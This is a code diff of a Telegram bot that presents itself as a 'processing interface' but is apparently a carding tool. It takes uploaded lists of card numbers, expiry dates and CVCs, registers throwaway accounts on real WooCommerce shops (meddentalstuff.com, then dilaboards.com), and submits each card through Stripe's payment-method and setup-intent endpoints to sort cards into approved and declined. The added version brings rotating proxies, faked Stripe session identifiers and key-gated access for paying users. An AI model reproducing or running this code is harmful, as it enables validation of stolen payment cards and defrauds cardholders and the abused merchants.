@@ -1,33 +1,23 @@
 # ============================================================
-#  Telegram Bot — Data Processing Interface
+#  Telegram Bot — ehhhh.py Processing Interface
 #  Made by TalkNeon
 # ============================================================
 
 import os
-import sys
 import re
 import time
 import random
 import json
-import uuid
 import string
 import threading
 import requests
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
-from bs4 import BeautifulSoup
-from fake_useragent import UserAgent
-from datetime import datetime
+from typing import Dict, Any, Optional
 
 try:
-    import brotli
+    from faker import Faker
+    faker = Faker()
 except ImportError:
-    brotli = None
-
-try:
-    from requests_toolbelt.multipart.encoder import MultipartEncoder
-except ImportError:
-    MultipartEncoder = None
+    faker = None
 
 # ============================================================
 #  Configuration
@@ -37,8 +27,8 @@ DEVELOPER = "TalkNeon"
 ADMIN_IDS = []  # Add your Telegram user IDs here
 
 DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
-KEYS_FILE = os.path.join(DATA_DIR, "tg_keys.json")
-USERS_FILE = os.path.join(DATA_DIR, "tg_users.json")
+KEYS_FILE = os.path.join(DATA_DIR, "tg_ehhhh_keys.json")
+USERS_FILE = os.path.join(DATA_DIR, "tg_ehhhh_users.json")
 
 os.makedirs(DATA_DIR, exist_ok=True)
 
@@ -148,169 +138,183 @@ def download_file(file_id):
 
 
 # ============================================================
-#  Processing engine (untouched logic from original script)
+#  Processing engine — EXACT logic from ehhhh.py (UNTOUCHED)
 # ============================================================
-def setup_session():
-    session = requests.Session()
-    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
-    adapter = HTTPAdapter(max_retries=retry)
-    session.mount("http://", adapter)
-    session.mount("https://", adapter)
-    ua = UserAgent()
-    session.headers.update({
-        "User-Agent": ua.random,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Connection": "keep-alive",
-    })
-    return session
+def auto_request(
+    url: str,
+    method: str = 'GET',
+    headers: Optional[Dict[str, str]] = None,
+    data: Optional[Dict[str, Any]] = None,
+    params: Optional[Dict[str, Any]] = None,
+    json_data: Optional[Dict[str, Any]] = None,
+    dynamic_params: Optional[Dict[str, Any]] = None,
+    session: Optional[requests.Session] = None,
+    proxies: Optional[Dict[str, str]] = None
+) -> requests.Response:
+    clean_headers = {}
+    if headers:
+        for key, value in headers.items():
+            if key.lower() != 'cookie':
+                clean_headers[key] = value
+
+    if data is None: data = {}
+    if params is None: params = {}
+
+    if dynamic_params:
+        for key, value in dynamic_params.items():
+            if 'ajax' in key.lower(): params[key] = value
+            else: data[key] = value
+
+    req_session = session if session else requests.Session()
+
+    request_kwargs = {
+        'url': url,
+        'headers': clean_headers,
+        'data': data if data else None,
+        'params': params if params else None,
+        'json': json_data,
+        'proxies': proxies,
+        'timeout': 20
+    }
+
+    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}
+    response = req_session.request(method, **request_kwargs)
+    return response
 
 
-def generate_email():
-    return f"user{random.randint(1000,9999)}@gmail.com"
-
-
-def generate_password():
-    return f"fifa24Iok#{random.randint(1000,9999)}"
-
-
-def get_script_data(page_soup):
-    script_tag = page_soup.find("script", string=re.compile(r"var wcpay_upe_config"))
-    if not script_tag:
-        script_tag = page_soup.find("script", string=re.compile(r"wcpay"))
-    if not script_tag:
-        scripts = page_soup.find_all("script")
-        for script in scripts:
-            if script.string and "createSetupIntentNonce" in script.string:
-                script_tag = script
-                break
-    if not script_tag or not script_tag.string:
-        return None, None, None
-    content = script_tag.string
-    nonce_match = re.search(r'"createSetupIntentNonce":"([^"]+)"', content)
-    key_match = re.search(r'"publishableKey":"([^"]+)"', content)
-    acc_id_match = re.search(r'"accountId":"([^"]+)"', content)
-    nonce = nonce_match.group(1) if nonce_match else None
-    key = key_match.group(1) if key_match else None
-    acc_id = acc_id_match.group(1) if acc_id_match else ""
-    return nonce, key, acc_id
-
-
-def check_card(card_data, session, ua):
-    n, mm, yy, cvc = card_data
+def extract_message(response: requests.Response) -> str:
     try:
-        mail = generate_email()
-        password = generate_password()
+        response_json = response.json()
+        if 'message' in response_json: return response_json['message']
 
-        reg_page = session.get("https://meddentalstuff.com/my-account/", timeout=15)
-        reg_page.raise_for_status()
-        soup = BeautifulSoup(reg_page.text, "html.parser")
-        register_nonce_tag = soup.find("input", {"name": "woocommerce-register-nonce"})
-        if not register_nonce_tag:
-            return "FAIL", "Could not find registration nonce"
-        register_nonce = register_nonce_tag["value"]
+        def find_msg(obj):
+            if isinstance(obj, dict):
+                if 'message' in obj: return obj['message']
+                for v in obj.values():
+                    res = find_msg(v)
+                    if res: return res
+            return None
 
-        reg_data = {
-            "email": mail,
-            "password": password,
-            "woocommerce-register-nonce": register_nonce,
-            "_wp_http_referer": "/my-account/",
-            "register": "Register",
-            "wc_order_attribution_session_start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        }
+        res_msg = find_msg(response_json)
+        if res_msg: return res_msg
 
-        reg_response = session.post("https://meddentalstuff.com/my-account/", data=reg_data, timeout=15)
-        reg_response.raise_for_status()
-        if reg_response.url == "https://meddentalstuff.com/my-account/":
-            soup_err = BeautifulSoup(reg_response.text, "html.parser")
-            err_msg = soup_err.find("ul", class_="woocommerce-error")
-            if err_msg:
-                return "FAIL", f"Registration failed: {err_msg.get_text(strip=True)}"
+        return f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"
+    except:
+        match = re.search(r'"message":"(.*?)"', response.text)
+        if match: return match.group(1)
+        return f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:100]}..."
 
-        payment_page = session.get("https://meddentalstuff.com/my-account/add-payment-method/", timeout=15)
-        payment_page.raise_for_status()
-        payment_soup = BeautifulSoup(payment_page.text, "html.parser")
 
-        nonce, key, acc_id = get_script_data(payment_soup)
-        if not nonce or not key:
-            return "FAIL", "Could not extract configuration"
+def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
+    session = requests.Session()
+    base_url = 'https://dilaboards.com'
+    user_ag = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
 
-        stripe_headers = {
-            "authority": "api.stripe.com",
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "user-agent": ua.random,
-        }
-        sessionid = str(uuid.uuid4())
-        guid = str(uuid.uuid4())
-        muid = str(uuid.uuid4())
-        sid = str(uuid.uuid4())
+    try:
+        url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
+        headers_1 = {'User-Agent': user_ag}
+        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxies)
 
-        stripe_data = (
-            f"billing_details[name]=+&billing_details[email]={mail}"
-            f"&billing_details[address][country]=US&billing_details[address][postal_code]=91711"
-            f"&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}"
-            f"&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F2dcfccda05%3B+stripe-js-v3%2F2dcfccda05%3B+payment-element%3B+deferred-intent"
-            f"&referrer=https%3A%2F%2Fmeddentalstuff.com&time_on_page=44602"
-            f"&client_attribution_metadata[client_session_id]={sessionid}"
-            f"&client_attribution_metadata[merchant_integration_source]=elements"
-            f"&client_attribution_metadata[merchant_integration_subtype]=payment-element"
-            f"&client_attribution_metadata[merchant_integration_version]=2021"
-            f"&client_attribution_metadata[payment_intent_creation_flow]=deferred"
-            f"&client_attribution_metadata[payment_method_selection_flow]=merchant_specified"
-            f"&client_attribution_metadata[elements_session_config_id]=8f2dd842-031b-4412-bcc5-bb7b38fb7f1b"
-            f"&guid={guid}&muid={muid}&sid={sid}&key={key}&_stripe_account={acc_id}"
-        )
+        reg_match = re.search('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
+        pk_match = re.search('"key":"(.*?)"', response_1.text)
+        if not reg_match or not pk_match: return "Failed to extract session tokens"
 
-        stripe_resp = session.post("https://api.stripe.com/v1/payment_methods",
-                                   headers=stripe_headers, data=stripe_data, timeout=15)
-        stripe_resp.raise_for_status()
-        stripe_json = stripe_resp.json()
-        pm_id = stripe_json.get("id")
-        if not pm_id:
-            error_msg = stripe_json.get("error", {}).get("message", "Unknown error")
-            return "DECLINED", error_msg
+        regester_nouce = reg_match.group(1)
+        pk = pk_match.group(1)
 
-        if not MultipartEncoder:
-            return "FAIL", "requests_toolbelt not installed"
-
-        multipart_data = MultipartEncoder({
-            "action": "create_setup_intent",
-            "wcpay-payment-method": pm_id,
-            "_ajax_nonce": nonce,
-        })
-        ajax_headers = {
-            "authority": "meddentalstuff.com",
-            "accept": "*/*",
-            "content-type": multipart_data.content_type,
-            "origin": "https://meddentalstuff.com",
-            "referer": "https://meddentalstuff.com/my-account/add-payment-method/",
-            "user-agent": ua.random,
-        }
-        ajax_resp = session.post("https://meddentalstuff.com/wp-admin/admin-ajax.php",
-                                 headers=ajax_headers, data=multipart_data, timeout=15)
-        ajax_resp.raise_for_status()
-
-        content_encoding = ajax_resp.headers.get("Content-Encoding", "")
-        if content_encoding == "br" and brotli:
-            content = brotli.decompress(ajax_resp.content).decode("utf-8")
+        if faker:
+            email = faker.email()
         else:
-            content = ajax_resp.text
+            email = f"user{random.randint(1000,9999)}@gmail.com"
 
-        if '"success":true' in content or '"success":True' in content:
-            return "APPROVED", None
-        else:
-            match = re.search(r'"message"\s*:\s*"([^"]+)"', content)
-            msg = match.group(1) if match else "Unknown error"
-            return "DECLINED", msg
+        data_2 = {
+            'email': email,
+            'woocommerce-register-nonce': regester_nouce,
+            'register': 'Register',
+        }
+        response_2 = auto_request(url_1, method='POST', headers={'User-Agent': user_ag}, data=data_2, session=session, proxies=proxies)
 
-    except requests.exceptions.RequestException as e:
-        return "ERROR", f"Network error: {str(e)}"
+        nonce_match = re.search('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)
+        if not nonce_match: return "Failed to extract ajax nonce"
+        ajax_nonce = nonce_match.group(1)
+
+        url_3 = 'https://api.stripe.com/v1/payment_methods'
+        muid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
+        sid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
+        guid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
+        client_id = "src_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
+
+        data_3 = {
+            'type': 'card',
+            'card[number]': card_num,
+            'card[cvc]': card_cvv,
+            'card[exp_year]': card_yy,
+            'card[exp_month]': card_mm,
+            'allow_redisplay': 'unspecified',
+            'billing_details[address][postal_code]': '11081',
+            'billing_details[address][country]': 'US',
+            'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
+            'referrer': f'{base_url}',
+            'time_on_page': str(random.randint(10000, 99999)),
+            'client_attribution_metadata[client_session_id]': client_id,
+            'client_attribution_metadata[merchant_integration_source]': 'elements',
+            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+            'client_attribution_metadata[merchant_integration_version]': '2021',
+            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+            'client_attribution_metadata[elements_session_config_id]': client_id,
+            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
+            'guid': guid, 'muid': muid, 'sid': sid, 'key': pk,
+            '_stripe_version': '2024-06-20',
+        }
+        response_3 = auto_request(url_3, method='POST', headers={'User-Agent': user_ag}, data=data_3, proxies=proxies)
+
+        if response_3.status_code != 200: return f"Stripe Error: {extract_message(response_3)}"
+        pm = response_3.json().get('id')
+
+        dynamic_params_4 = {
+            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
+            'action': 'create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': pm,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': ajax_nonce,
+        }
+        response_4 = auto_request(base_url + '/en/', method='POST', headers={'User-Agent': user_ag}, dynamic_params=dynamic_params_4, session=session, proxies=proxies)
+
+        msg = extract_message(response_4)
+        status = "Approved" if response_4.json().get("success") else "Declined"
+        return f"{status} | {msg}"
     except Exception as e:
-        return "ERROR", f"Unexpected error: {str(e)}"
+        return f"Error: {str(e)}"
+
+
+def format_proxy(proxy_str):
+    if not proxy_str: return None
+    parts = proxy_str.split(':')
+    if len(parts) == 2:
+        return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
+    elif len(parts) == 4:
+        ip, port, user, pwd = parts
+        return {"http": f"http://{user}:{pwd}@{ip}:{port}", "https": f"http://{user}:{pwd}@{ip}:{port}"}
+    return None
+
+
+def process_single_entry(entry, proxies_list):
+    """Process a single entry — exact replica of process_card from ehhhh.py."""
+    raw_proxy = random.choice(proxies_list) if proxies_list else None
+    proxy_dict = format_proxy(raw_proxy)
+
+    try:
+        c_data = entry.split('|')
+        if len(c_data) == 4:
+            c_num, c_mm, c_yy, c_cvv = c_data
+            result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
+        else:
+            result = "Error: Invalid Format"
+    except Exception as e:
+        result = f"Error: {str(e)}"
+
+    return result
 
 
 # ============================================================
@@ -318,47 +322,40 @@ def check_card(card_data, session, ua):
 # ============================================================
 def run_processing(lines, on_progress=None, on_complete=None):
     """Process entries and call on_progress / on_complete callbacks."""
-    session = setup_session()
-    ua = UserAgent()
+    proxy_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")
+    proxies_list = []
+    if os.path.exists(proxy_file):
+        with open(proxy_file, 'r') as f:
+            proxies_list = [line.strip() for line in f if line.strip()]
 
     total = len(lines)
     results = {"approved": 0, "declined": 0, "errors": 0, "total": total, "approved_list": []}
 
     for idx, line in enumerate(lines, 1):
-        parts = line.split("|")
-        if len(parts) < 4:
+        entry = line.strip()
+        if not entry:
             results["errors"] += 1
             if on_progress:
-                on_progress(idx, total, results, line.strip(), "INVALID", "Bad format")
+                on_progress(idx, total, results, entry, "INVALID", "Empty line")
             continue
 
-        n = parts[0].strip()
-        mm = parts[1].strip()
-        yy = parts[2].strip()
-        cvc = parts[3].strip()
+        result = process_single_entry(entry, proxies_list)
 
-        if mm not in ["10", "11", "12"] and len(mm) == 1:
-            mm = f"0{mm}"
-        if not yy.startswith("20") and len(yy) == 2:
-            yy = f"20{yy}"
-
-        status, msg = check_card((n, mm, yy, cvc), session, ua)
-
-        entry = f"{n}|{mm}|{yy}|{cvc}"
-        if status == "APPROVED":
+        if "Approved" in result:
             results["approved"] += 1
             results["approved_list"].append(entry)
-        elif status == "DECLINED":
+            status = "APPROVED"
+        elif "Declined" in result:
             results["declined"] += 1
+            status = "DECLINED"
         else:
             results["errors"] += 1
+            status = "ERROR"
+
+        detail = result.split(" | ", 1)[1] if " | " in result else result
 
         if on_progress:
-            on_progress(idx, total, results, entry, status, msg)
-
-        time.sleep(random.uniform(0.5, 1.5))
-
-    session.close()
+            on_progress(idx, total, results, entry, status, detail)
 
     if on_complete:
         on_complete(results)
@@ -466,17 +463,14 @@ def handle_update(update):
     user_id = msg["from"]["id"]
     text = (msg.get("text") or "").strip()
 
-    # --- /start ---
     if text == "/start":
         send_message(chat_id, fmt_start())
         return
 
-    # --- /lookup ---
     if text == "/lookup":
         send_message(chat_id, f"<b>Lookup</b>\n\nComing soon.{FOOTER}")
         return
 
-    # --- /genkey (admin) ---
     if text.startswith("/genkey"):
         if not is_admin(user_id):
             send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
@@ -488,7 +482,6 @@ def handle_update(update):
         send_message(chat_id, f"<b>Key Generated</b>\n\n<code>{key}</code>{FOOTER}")
         return
 
-    # --- /redeem ---
     if text.startswith("/redeem"):
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
@@ -509,7 +502,6 @@ def handle_update(update):
         send_message(chat_id, f"<b>Access Granted</b>\n\nWelcome aboard.{FOOTER}")
         return
 
-    # --- /run ---
     if text == "/run":
         if not is_authorized(user_id):
             send_message(chat_id, fmt_unauthorized())
@@ -532,7 +524,6 @@ def handle_update(update):
                 return
             active_users.add(user_id)
 
-        # Download file
         content = download_file(doc["file_id"])
         if not content:
             with active_lock:
@@ -547,19 +538,16 @@ def handle_update(update):
             send_message(chat_id, "<b>File is empty.</b>" + FOOTER)
             return
 
-        # Send initial progress message
         init_resp = send_message(chat_id,
             f"<b>Starting</b>\n\nEntries: {len(lines)}\nPlease wait..."
             + FOOTER)
         progress_msg_id = init_resp.get("result", {}).get("message_id")
 
-        # Run processing in a thread
         def _run():
             last_edit = [0]
 
             def on_progress(idx, total, results, entry, status, detail):
                 now = time.time()
-                # Edit at most every 3 seconds to avoid rate limits
                 if now - last_edit[0] < 3 and idx < total:
                     return
                 last_edit[0] = now
@@ -583,14 +571,12 @@ def handle_update(update):
         t.start()
         return
 
-    # Ignore other messages silently
-
 
 # ============================================================
 #  Polling loop
 # ============================================================
 def main():
-    print(f"[Bot] Starting — Made by {DEVELOPER}")
+    print(f"[Bot] Starting ehhhh processor — Made by {DEVELOPER}")
     print(f"[Bot] Polling for updates...")
 
     offset = 0
